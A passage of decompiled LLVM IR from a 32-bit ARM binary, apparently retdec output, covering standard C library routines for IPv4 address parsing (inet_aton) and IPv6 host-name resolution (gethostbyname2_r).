  %v2_10b98 = load i32, i32* @r4, align 4
  %v3_10b98 = add i32 %v2_10b98, 16
  %v4_10b98 = inttoptr i32 %v3_10b98 to i8*
  store i8 %v1_10b98, i8* %v4_10b98, align 1
  %v0_10b9c = load i32, i32* @r4, align 4
  %v1_10b9c = add i32 %v0_10b9c, 17
  store i32 %v1_10b9c, i32* %r0.global-to-local, align 4
  %v4_10ba0 = call i32 @__GI_mempcpy(i32 %v1_10b9c, i32 %v2_10b8c, i32 19, i32 %v3_10b7c)
  store i32 %v4_10ba0, i32* %r0.global-to-local, align 4
  %v0_10ba4 = load i32, i32* @r5, align 4
  store i32 %v0_10ba4, i32* %r1.global-to-local, align 4
  %v3_10bac = inttoptr i32 %v4_10ba0 to i8*
  %v4_10bac = call i32 @__GI_memset(i8* %v3_10bac, i32 %v0_10ba4, i32 13)
  store i32 %v4_10bac, i32* %r0.global-to-local, align 4
  %v0_10bb0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10bb0

dec_label_pc_10bb0:                               ; preds = %entry, %dec_label_pc_10b6c
  %v0_10bb0 = phi i32 [ %v0_10b60, %entry ], [ %v0_10bb0.pre, %dec_label_pc_10b6c ]
  store i32 %v0_10bb0, i32* %r0.global-to-local, align 4
  store i32 %v3_10b48, i32* @r4, align 4
  store i32 %v6_10b48, i32* @r5, align 4
  store i32 %v9_10b48, i32* @r6, align 4
  ret i32 %v0_10bb0

; uselistorder directives
  uselistorder i32 %v0_10bb0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_10bb0, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_10bc4 = load i32, i32* @r4, align 4
  store i32 %v3_10bc4, i32* %stack_var_-28, align 4
  %v0_10bcc = load i32, i32* %r0.global-to-local, align 4
  %v2_10bcc = icmp eq i32 %v0_10bcc, 0
  br i1 %v2_10bcc, label %dec_label_pc_10ca8, label %dec_label_pc_10bdc

dec_label_pc_10bdc:                               ; preds = %entry
  br label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10bdc, %dec_label_pc_10c6c
  %v1_10c6c = phi i32 [ 0, %dec_label_pc_10bdc ], [ %v5_10c6c, %dec_label_pc_10c6c ]
  %v0_10c70 = phi i32 [ 1, %dec_label_pc_10bdc ], [ %v1_10c70, %dec_label_pc_10c6c ]
  %v0_10bf4 = phi i32 [ %v0_10bcc, %dec_label_pc_10bdc ], [ %v0_10bf412, %dec_label_pc_10c6c ]
  %v1_10bf4 = inttoptr i32 %v0_10bf4 to i8*
  %v2_10bf4 = load i8, i8* %v1_10bf4, align 1
  %v3_10bf4 = zext i8 %v2_10bf4 to i32
  %v4_10bf8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 196) to i32*), align 4
  %v2_10bfc = mul nuw nsw i32 %v3_10bf4, 2
  %v2_10c00 = add i32 %v2_10bfc, %v4_10bf8
  %v3_10c00 = inttoptr i32 %v2_10c00 to i16*
  %v4_10c00 = load i16, i16* %v3_10c00, align 2
  %v1_10c04 = and i16 %v4_10c00, 8
  %v2_10c04 = icmp eq i16 %v1_10c04, 0
  br i1 %v2_10c04, label %dec_label_pc_10ca8, label %dec_label_pc_10c0c

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10bf4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10c2c

dec_label_pc_10c14:                               ; preds = %dec_label_pc_10c2c
  %v2_10c14 = mul i32 %v0_10c6c, 10
  %v1_10c18 = add i32 %v2_10c14, -48
  %v2_10c1c = add i32 %v3_10c2c, %v1_10c18
  store i32 %v2_10c1c, i32* @ip, align 4
  %v8_10c24 = icmp sgt i32 %v2_10c1c, 255
  br i1 %v8_10c24, label %dec_label_pc_10ca8, label %dec_label_pc_10c28

dec_label_pc_10c28:                               ; preds = %dec_label_pc_10c14
  %v1_10c28 = add i32 %v0_10c5c, 1
  store i32 %v1_10c28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c2c

dec_label_pc_10c2c:                               ; preds = %dec_label_pc_10c0c, %dec_label_pc_10c28
  %v0_10c6c = phi i32 [ 0, %dec_label_pc_10c0c ], [ %v2_10c1c, %dec_label_pc_10c28 ]
  %v0_10c5c = phi i32 [ %v0_10bf4, %dec_label_pc_10c0c ], [ %v1_10c28, %dec_label_pc_10c28 ]
  %v1_10c2c = inttoptr i32 %v0_10c5c to i8*
  %v2_10c2c = load i8, i8* %v1_10c2c, align 1
  %v3_10c2c = zext i8 %v2_10c2c to i32
  %v2_10c30 = mul nuw nsw i32 %v3_10c2c, 2
  %v2_10c34 = add i32 %v2_10c30, %v4_10bf8
  %v3_10c34 = inttoptr i32 %v2_10c34 to i16*
  %v4_10c34 = load i16, i16* %v3_10c34, align 2
  %v6_10c34 = zext i16 %v4_10c34 to i32
  %v1_10c38 = and i32 %v6_10c34, 8
  %v2_10c38 = icmp eq i32 %v1_10c38, 0
  br i1 %v2_10c38, label %dec_label_pc_10c40, label %dec_label_pc_10c14

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c2c
  %v7_10c40 = icmp eq i32 %v0_10c70, 4
  br i1 %v7_10c40, label %dec_label_pc_10c58, label %dec_label_pc_10c48

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c40
  %v7_10c48 = icmp eq i8 %v2_10c2c, 46
  br i1 %v7_10c48, label %dec_label_pc_10c50, label %dec_label_pc_10ca8

dec_label_pc_10c50:                               ; preds = %dec_label_pc_10c48
  %v1_10c50 = add i32 %v0_10c5c, 1
  store i32 %v1_10c50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c6c

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c40
  %v2_10c58 = icmp eq i8 %v2_10c2c, 0
  %v1_10c5c = add i32 %v0_10c5c, 1
  store i32 %v1_10c5c, i32* %r0.global-to-local, align 4
  br i1 %v2_10c58, label %dec_label_pc_10c6c, label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c58
  %v1_10c64 = and i32 %v6_10c34, 32
  %v2_10c64 = icmp eq i32 %v1_10c64, 0
  br i1 %v2_10c64, label %dec_label_pc_10ca8, label %dec_label_pc_10c6c

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c64, %dec_label_pc_10c58, %dec_label_pc_10c50
  %v0_10bf412 = phi i32 [ %v1_10c5c, %dec_label_pc_10c64 ], [ %v1_10c5c, %dec_label_pc_10c58 ], [ %v1_10c50, %dec_label_pc_10c50 ]
  %v4_10c6c = mul i32 %v1_10c6c, 256
  %v5_10c6c = or i32 %v0_10c6c, %v4_10c6c
  %v1_10c70 = add nuw nsw i32 %v0_10c70, 1
  %v7_10c78 = icmp slt i32 %v1_10c70, 5
  br i1 %v7_10c78, label %dec_label_pc_10bf4, label %dec_label_pc_10c7c

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c6c
  %v2_10c7c = icmp eq i32 %arg2, 0
  br i1 %v2_10c7c, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_10c7c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cac

bb:                                               ; preds = %dec_label_pc_10c7c
  %v4_10c80 = udiv i32 %v5_10c6c, 16777216
  %v2_10c84 = udiv i32 %v5_10c6c, 256
  %v5_10c88 = and i32 %v2_10c84, 65280
  %v2_10c8c = and i32 %v5_10c6c, 65280
  %v5_10c90 = mul nuw nsw i32 %v2_10c8c, 256
  %v5_10c94 = mul i32 %v0_10c6c, 16777216
  %v6_10c88 = or i32 %v4_10c80, %v5_10c94
  %v6_10c90 = or i32 %v6_10c88, %v5_10c88
  %v6_10c94 = or i32 %v6_10c90, %v5_10c90
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_10ca0 = inttoptr i32 %arg2 to i32*
  store i32 %v6_10c94, i32* %v3_10ca0, align 4
  %v2_10cac.pre = load i32, i32* %stack_var_-28, align 4
  %v1_10cb0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cac

dec_label_pc_10ca8:                               ; preds = %dec_label_pc_10c48, %dec_label_pc_10c64, %dec_label_pc_10bf4, %dec_label_pc_10c14, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_10ca8
  %v1_10cb0 = phi i32 [ %v1_10cb0.pre, %bb ], [ 0, %dec_label_pc_10ca8 ], [ 1, %.thread7.thread ]
  %v2_10cac = phi i32 [ %v2_10cac.pre, %bb ], [ %v3_10bc4, %dec_label_pc_10ca8 ], [ %v3_10bc4, %.thread7.thread ]
  store i32 %v2_10cac, i32* @r4, align 4
  ret i32 %v1_10cb0

; uselistorder directives
  uselistorder i32 %v1_10c70, { 1, 0 }
  uselistorder i32 %v5_10c6c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10c5c, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10cac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10ca8, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10bf4, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp24, i32* %stack_var_0, align 4
  %v6_10cbc = load i32, i32* @r5, align 4
  %v9_10cbc = load i32, i32* @r6, align 4
  %v12_10cbc = load i32, i32* @r7, align 4
  %v15_10cbc = load i32, i32* @r8, align 4
  %v18_10cbc = load i32, i32* @sb, align 4
  %v24_10cbc = load i32, i32* @fp, align 4
  %v0_10cc0 = load i32, i32* @r1, align 4
  %v7_10cc0 = icmp eq i32 %v0_10cc0, 2
  store i32 %arg1, i32* @sb, align 4
  %v0_10ccc = load i32, i32* @r2, align 4
  store i32 %v0_10ccc, i32* @r7, align 4
  %v0_10cd0 = load i32, i32* @r3, align 4
  store i32 %v0_10cd0, i32* @r8, align 4
  br i1 %v7_10cc0, label %dec_label_pc_10cdc, label %dec_label_pc_10cfc

dec_label_pc_10cdc:                               ; preds = %entry
  store i32 %tmp12, i32* @ip, align 4
  store i32 %v0_10ccc, i32* @r1, align 4
  store i32 %v0_10cd0, i32* @r2, align 4
  store i32 %tmp24, i32* @r3, align 4
  %v0_10cf4 = call i32 @gethostbyname_r()
  store i32 %v0_10cf4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10f70

dec_label_pc_10cfc:                               ; preds = %entry
  store i32 0, i32* @sl, align 4
  %v7_10d04 = icmp eq i32 %v0_10cc0, 10
  %v2_10d08 = inttoptr i32 %tmp12 to i32*
  store i32 0, i32* %v2_10d08, align 4
  br i1 %v7_10d04, label %dec_label_pc_10d10, label %dec_label_pc_10f6c

dec_label_pc_10d10:                               ; preds = %dec_label_pc_10cfc
  %v1_10d10 = load i32, i32* @sl, align 4
  %v9_10d10 = icmp eq i32 %v1_10d10, %arg1
  br i1 %v9_10d10, label %dec_label_pc_10f6c, label %dec_label_pc_10d18

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10d10
  %v0_10d20 = call i32 @__aeabi_read_tp()
  store i32 %v0_10d20, i32* %r0.global-to-local, align 4
  %v3_10d24 = load i16, i16* @global_var_222f0.75, align 2
  %v4_10d24 = sext i16 %v3_10d24 to i32
  store i32 %v4_10d24, i32* @r5, align 4
  store i32 %tmp12, i32* @lr, align 4
  %v2_10d34 = add i32 %v4_10d24, %v0_10d20
  %v3_10d34 = inttoptr i32 %v2_10d34 to i32*
  %v4_10d34 = load i32, i32* %v3_10d34, align 4
  store i32 %v4_10d34, i32* @r4, align 4
  store i32 %v0_10d20, i32* @r6, align 4
  %v0_10d3c = load i32, i32* @sl, align 4
  store i32 %v0_10d3c, i32* %v3_10d34, align 4
  %v0_10d40 = load i32, i32* @sb, align 4
  store i32 %v0_10d40, i32* %r0.global-to-local, align 4
  %v1_10d4c = call i32 @__get_hosts_byname_r(i32 %v0_10d40)
  store i32 %v1_10d4c, i32* %r0.global-to-local, align 4
  %v2_10d50 = icmp eq i32 %v1_10d4c, 0
  br i1 %v2_10d50, label %.thread1, label %dec_label_pc_10d64

.thread1:                                         ; preds = %dec_label_pc_10d18
  %v4_10d58 = load i16, i16* @global_var_222f0.75, align 2
  %v5_10d58 = sext i16 %v4_10d58 to i32
  store i32 %v5_10d58, i32* %r3.global-to-local, align 4
  %v1_10d5c = load i32, i32* @r4, align 4
  %v2_10d5c = load i32, i32* @r6, align 4
  %v4_10d5c = add i32 %v2_10d5c, %v5_10d58
  %v5_10d5c = inttoptr i32 %v4_10d5c to i32*
  store i32 %v1_10d5c, i32* %v5_10d5c, align 4
  br label %dec_label_pc_10f70

dec_label_pc_10d64:                               ; preds = %dec_label_pc_10d18
  %v0_10d64 = load i32, i32* @fp, align 4
  %v1_10d64 = inttoptr i32 %v0_10d64 to i32*
  %v2_10d64 = load i32, i32* %v1_10d64, align 4
  store i32 %v2_10d64, i32* %r3.global-to-local, align 4
  %v7_10d68 = icmp eq i32 %v2_10d64, 1
  br i1 %v7_10d68, label %dec_label_pc_10d84, label %dec_label_pc_10d70

dec_label_pc_10d70:                               ; preds = %dec_label_pc_10d64
  %v7_10d70 = icmp eq i32 %v2_10d64, 4
  br i1 %v7_10d70, label %dec_label_pc_10da8, label %dec_label_pc_10d78

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d70
  %v3_10d78 = icmp eq i32 %v2_10d64, -1
  br i1 %v3_10d78, label %dec_label_pc_10d94, label %dec_label_pc_10f70

dec_label_pc_10d84:                               ; preds = %dec_label_pc_10d64
  %v7_10d84 = icmp eq i32 %v1_10d4c, 2
  br i1 %v7_10d84, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_10d84
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_10dac

.thread3:                                         ; preds = %dec_label_pc_10d84
  store i32 1, i32* @r6, align 4
  br label %dec_label_pc_10dac

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10d78
  %v3_10d98 = load i16, i16* @global_var_222f0.75, align 2
  %v4_10d98 = sext i16 %v3_10d98 to i32
  store i32 %v4_10d98, i32* %r3.global-to-local, align 4
  %v0_10d9c = load i32, i32* @r6, align 4
  %v2_10d9c = add i32 %v0_10d9c, %v4_10d98
  %v3_10d9c = inttoptr i32 %v2_10d9c to i32*
  %v4_10d9c = load i32, i32* %v3_10d9c, align 4
  store i32 %v4_10d9c, i32* %r3.global-to-local, align 4
  %v7_10da0 = icmp eq i32 %v4_10d9c, 2
  br i1 %v7_10da0, label %dec_label_pc_10da8, label %dec_label_pc_10f70

dec_label_pc_10da8:                               ; preds = %dec_label_pc_10d94, %dec_label_pc_10d70
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_10dac

dec_label_pc_10dac:                               ; preds = %bb, %.thread3, %dec_label_pc_10da8
  %v3_10dac = load i32, i32* %stack_var_0, align 4
  store i32 %v3_10dac, i32* %r0.global-to-local, align 4
  %v0_10db0 = load i32, i32* @r8, align 4
  %v1_10db0 = sub i32 0, %v0_10db0
  %v1_10db4 = urem i32 %v1_10db0, 4
  store i32 %v1_10db4, i32* %r1.global-to-local, align 4
  %v2_10dbc = sub i32 %v3_10dac, %v1_10db4
  store i32 %v2_10dbc, i32* %r2.global-to-local, align 4
  %v3_10dc0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_10dc0 = sext i16 %v3_10dc0 to i32
  store i32 %v4_10dc0, i32* %r3.global-to-local, align 4
  %v0_10dc4 = call i32 @__aeabi_read_tp()
  store i32 %v0_10dc4, i32* %r0.global-to-local, align 4
  %v1_10dc8 = add i32 %v2_10dbc, -24
  store i32 %v1_10dc8, i32* @sl, align 4
  %v0_10dcc = load i32, i32* @r4, align 4
  %v3_10dcc = add i32 %v4_10dc0, %v0_10dc4
  %v4_10dcc = inttoptr i32 %v3_10dcc to i32*
  store i32 %v0_10dcc, i32* %v4_10dcc, align 4
  %v0_10dd0 = load i32, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10dd8 = load i32, i32* @fp, align 4
  %v2_10dd8 = inttoptr i32 %v1_10dd8 to i32*
  store i32 -1, i32* %v2_10dd8, align 4
  %v7_10ddc = icmp sgt i32 %v0_10dd0, 255
  br i1 %v7_10ddc, label %dec_label_pc_10de4, label %bb27

bb27:                                             ; preds = %dec_label_pc_10dac
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10f70

dec_label_pc_10de4:                               ; preds = %dec_label_pc_10dac
  %v0_10de4 = load i32, i32* @r8, align 4
  %v1_10de4 = load i32, i32* %r1.global-to-local, align 4
  %v2_10de4 = add i32 %v1_10de4, %v0_10de4
  store i32 %v2_10de4, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_10dec = add i32 %v2_10de4, 16
  store i32 %v1_10dec, i32* %r2.global-to-local, align 4
  %v1_10df0 = add i32 %v2_10de4, 24
  store i32 %v1_10df0, i32* @r5, align 4
  %v3_10df8 = inttoptr i32 %v1_10dec to i32*
  store i32 %v2_10de4, i32* %v3_10df8, align 4
  %v0_10dfc = load i32, i32* @sb, align 4
  store i32 %v0_10dfc, i32* @r1, align 4
  %v0_10e00 = load i32, i32* @r4, align 4
  %v1_10e00 = load i32, i32* %r2.global-to-local, align 4
  %v2_10e00 = add i32 %v1_10e00, 4
  %v3_10e00 = inttoptr i32 %v2_10e00 to i32*
  store i32 %v0_10e00, i32* %v3_10e00, align 4
  %v0_10e04 = load i32, i32* @r5, align 4
  store i32 %v0_10e04, i32* %r0.global-to-local, align 4
  %v0_10e08 = load i32, i32* @sl, align 4
  store i32 %v0_10e08, i32* %r2.global-to-local, align 4
  %v3_10e0c = call i32 @strncpy(i32 %v0_10e04, i32 %v0_10dfc, i32 %v0_10e08)
  %v0_10e10 = load i32, i32* @r4, align 4
  %v1_10e10 = trunc i32 %v0_10e10 to i8
  %v2_10e10 = load i32, i32* @r5, align 4
  %v3_10e10 = load i32, i32* @sl, align 4
  %v4_10e10 = add i32 %v3_10e10, %v2_10e10
  %v5_10e10 = inttoptr i32 %v4_10e10 to i8*
  store i8 %v1_10e10, i8* %v5_10e10, align 1
  %v0_10e14 = load i32, i32* @sb, align 4
  store i32 %v0_10e14, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_10e1c = load i32, i32* @r8, align 4
  store i32 %v0_10e1c, i32* %r2.global-to-local, align 4
  %v3_10e20 = inttoptr i32 %v0_10e14 to i8*
  %v4_10e20 = call i32 @inet_pton(i32 10, i8* %v3_10e20, i32 %v0_10e1c)
  store i32 %v4_10e20, i32* %r0.global-to-local, align 4
  %v1_10e24 = load i32, i32* @r4, align 4
  %v9_10e24 = icmp eq i32 %v4_10e20, %v1_10e24
  br i1 %v9_10e24, label %dec_label_pc_10e5c, label %dec_label_pc_10e2c

dec_label_pc_10e2c:                               ; preds = %dec_label_pc_10de4
  store i32 %v1_10dec, i32* @ip, align 4
  %v0_10e34 = load i32, i32* @r7, align 4
  store i32 %v0_10e34, i32* %v2_10d08, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_10e3c = load i32, i32* @r7, align 4
  %v2_10e3c = add i32 %v1_10e3c, 8
  %v3_10e3c = inttoptr i32 %v2_10e3c to i32*
  store i32 10, i32* %v3_10e3c, align 4
  %v0_10e40 = load i32, i32* @r4, align 4
  store i32 %v0_10e40, i32* %r0.global-to-local, align 4
  %v0_10e44 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e44 = add i32 %v0_10e44, 6
  store i32 %v1_10e44, i32* %r3.global-to-local, align 4
  %v1_10e48 = load i32, i32* @r7, align 4
  %v2_10e48 = add i32 %v1_10e48, 12
  %v3_10e48 = inttoptr i32 %v2_10e48 to i32*
  store i32 %v1_10e44, i32* %v3_10e48, align 4
  %v0_10e4c = load i32, i32* @r5, align 4
  %v1_10e4c = load i32, i32* @r7, align 4
  %v2_10e4c = inttoptr i32 %v1_10e4c to i32*
  store i32 %v0_10e4c, i32* %v2_10e4c, align 4
  %v0_10e50 = load i32, i32* @ip, align 4
  %v1_10e50 = load i32, i32* @r7, align 4
  %v2_10e50 = add i32 %v1_10e50, 16
  %v3_10e50 = inttoptr i32 %v2_10e50 to i32*
  store i32 %v0_10e50, i32* %v3_10e50, align 4
  %v0_10e54 = load i32, i32* @r4, align 4
  %v1_10e54 = load i32, i32* @fp, align 4
  %v2_10e54 = inttoptr i32 %v1_10e54 to i32*
  store i32 %v0_10e54, i32* %v2_10e54, align 4
  br label %dec_label_pc_10f70

dec_label_pc_10e5c:                               ; preds = %dec_label_pc_10de4
  %v0_10e5c = load i32, i32* @r6, align 4
  %v2_10e5c = icmp eq i32 %v0_10e5c, 0
  br i1 %v2_10e5c, label %dec_label_pc_10e64, label %dec_label_pc_10f5c

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e5c
  %v2_10e64 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_10e64, i32* @r4, align 4
  store i32 %v2_10e64, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v3_10e74 = bitcast i32* %stack_var_-84 to i8*
  %v4_10e74 = call i32 @__GI_memset(i8* %v3_10e74, i32 0, i32 40)
  store i32 %v4_10e74, i32* %r0.global-to-local, align 4
  %v2_10e7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_10e7c, i32* @sb, align 4
  %v7_10ebc = icmp eq i32 %tmp7, 5
  br label %dec_label_pc_10e80

dec_label_pc_10e80:                               ; preds = %dec_label_pc_10ed4, %dec_label_pc_10e64
  store i32 %v2_10e7c, i32* %r2.global-to-local, align 4
  store i32 %v2_10e64, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v0_10e8c = load i32, i32* @r5, align 4
  store i32 %v0_10e8c, i32* %r0.global-to-local, align 4
  %v4_10e90 = inttoptr i32 %v0_10e8c to i8*
  %v5_10e90 = call i32 @__dns_lookup(i8* %v4_10e90, i32 28, i32 %v2_10e7c, i32 %v2_10e64)
  store i32 %v5_10e90, i32* @r4, align 4
  %v1_10e94 = icmp slt i32 %v5_10e90, 0
  %v0_10e98 = load i32, i32* @sl, align 4
  store i32 %v0_10e98, i32* %r2.global-to-local, align 4
  %v0_10e9c = load i32, i32* @r6, align 4
  %v1_10e9c = add i32 %v0_10e9c, 1
  store i32 %v1_10e9c, i32* @r6, align 4
  %v0_10ea0 = load i32, i32* @r5, align 4
  store i32 %v0_10ea0, i32* %r0.global-to-local, align 4
  br i1 %v1_10e94, label %dec_label_pc_10f5c, label %dec_label_pc_10ea8

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10e80
  %v3_10ea8 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_10ea8, i32* @r1, align 4
  %v3_10eac = call i32 @strncpy(i32 %v0_10ea0, i32 %v3_10ea8, i32 %v0_10e98)
  %v3_10eb0 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_10eb0, i32* @r0, align 4
  %v0_10eb4 = call i32 @free()
  store i32 %v0_10eb4, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r1.global-to-local, align 4
  %v0_10ec0 = load i32, i32* @r4, align 4
  store i32 %v0_10ec0, i32* %r2.global-to-local, align 4
  %v0_10ec4 = load i32, i32* @r5, align 4
  store i32 %v0_10ec4, i32* @r3, align 4
  br i1 %v7_10ebc, label %dec_label_pc_10ecc, label %dec_label_pc_10f04

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10ea8
  %v0_10ecc = load i32, i32* @r6, align 4
  %v8_10ed0 = icmp sgt i32 %v0_10ecc, 5
  br i1 %v8_10ed0, label %dec_label_pc_10ef8, label %dec_label_pc_10ed4

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_10ecc
  store i32 %tmp6, i32* @r1, align 4
  %v3_10ed8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10ed8, i32* %r0.global-to-local, align 4
  %v0_10edc = load i32, i32* @sl, align 4
  %v5_10ee0 = call i32 @__decode_dotted(i32 %v3_10ed8, i32 %tmp6, i32 %v0_10ec0, i32 %v0_10ec4, i32 %v0_10edc)
  store i32 %v5_10ee0, i32* @r4, align 4
  %v3_10ee8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10ee8, i32* @r0, align 4
  %v0_10eec = call i32 @free()
  store i32 %v0_10eec, i32* %r0.global-to-local, align 4
  %v0_10ef0 = load i32, i32* @r4, align 4
  %v1_10ef0 = icmp slt i32 %v0_10ef0, 0
  br i1 %v1_10ef0, label %dec_label_pc_10ef8, label %dec_label_pc_10e80

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10ed4, %dec_label_pc_10ecc
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f64

dec_label_pc_10f04:                               ; preds = %dec_label_pc_10ea8
  %v7_10f04 = icmp eq i32 %tmp7, 28
  br i1 %v7_10f04, label %dec_label_pc_10f0c, label %dec_label_pc_10f54

dec_label_pc_10f0c:                               ; preds = %dec_label_pc_10f04
  store i32 16, i32* @r2, align 4
  %v0_10f14 = load i32, i32* @r8, align 4
  store i32 %v0_10f14, i32* @r0, align 4
  %v0_10f18 = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_10dec, i32* @lr, align 4
  %v1_10f24 = load i32, i32* @r7, align 4
  %v2_10f24 = add i32 %v1_10f24, 8
  %v3_10f24 = inttoptr i32 %v2_10f24 to i32*
  store i32 10, i32* %v3_10f24, align 4
  %v0_10f28 = load i32, i32* %r3.global-to-local, align 4
  %v1_10f28 = add i32 %v0_10f28, 6
  store i32 %v1_10f28, i32* %r3.global-to-local, align 4
  %v1_10f2c = load i32, i32* @r7, align 4
  %v2_10f2c = add i32 %v1_10f2c, 12
  %v3_10f2c = inttoptr i32 %v2_10f2c to i32*
  store i32 %v1_10f28, i32* %v3_10f2c, align 4
  %v3_10f30 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10f30, i32* @r0, align 4
  %v0_10f34 = load i32, i32* @r5, align 4
  %v1_10f34 = load i32, i32* @r7, align 4
  %v2_10f34 = inttoptr i32 %v1_10f34 to i32*
  store i32 %v0_10f34, i32* %v2_10f34, align 4
  %v0_10f38 = load i32, i32* @lr, align 4
  %v1_10f38 = load i32, i32* @r7, align 4
  %v2_10f38 = add i32 %v1_10f38, 16
  %v3_10f38 = inttoptr i32 %v2_10f38 to i32*
  store i32 %v0_10f38, i32* %v3_10f38, align 4
  %v0_10f3c = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10f4c = load i32, i32* @r7, align 4
  store i32 %v0_10f4c, i32* %v2_10d08, align 4
  %v0_10f64.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f64

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f04
  %v3_10f54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10f54, i32* @r0, align 4
  %v0_10f58 = call i32 @free()
  store i32 %v0_10f58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10f5c

dec_label_pc_10f5c:                               ; preds = %dec_label_pc_10e80, %dec_label_pc_10e5c, %dec_label_pc_10f54
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f64

dec_label_pc_10f64:                               ; preds = %dec_label_pc_10f0c, %dec_label_pc_10ef8, %dec_label_pc_10f5c
  %v0_10f64 = phi i32 [ %v0_10f64.pre, %dec_label_pc_10f0c ], [ 3, %dec_label_pc_10ef8 ], [ 1, %dec_label_pc_10f5c ]
  %v1_10f64 = load i32, i32* @fp, align 4
  %v2_10f64 = inttoptr i32 %v1_10f64 to i32*
  store i32 %v0_10f64, i32* %v2_10f64, align 4
  br label %dec_label_pc_10f70

dec_label_pc_10f6c:                               ; preds = %dec_label_pc_10cfc, %dec_label_pc_10d10
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10f70

dec_label_pc_10f70:                               ; preds = %.thread1, %bb27, %dec_label_pc_10d94, %dec_label_pc_10d78, %dec_label_pc_10cdc, %dec_label_pc_10f64, %dec_label_pc_10e2c, %dec_label_pc_10f6c
  store i32 %v6_10cbc, i32* @r5, align 4
  store i32 %v9_10cbc, i32* @r6, align 4
  store i32 %v12_10cbc, i32* @r7, align 4
  store i32 %v15_10cbc, i32* @r8, align 4
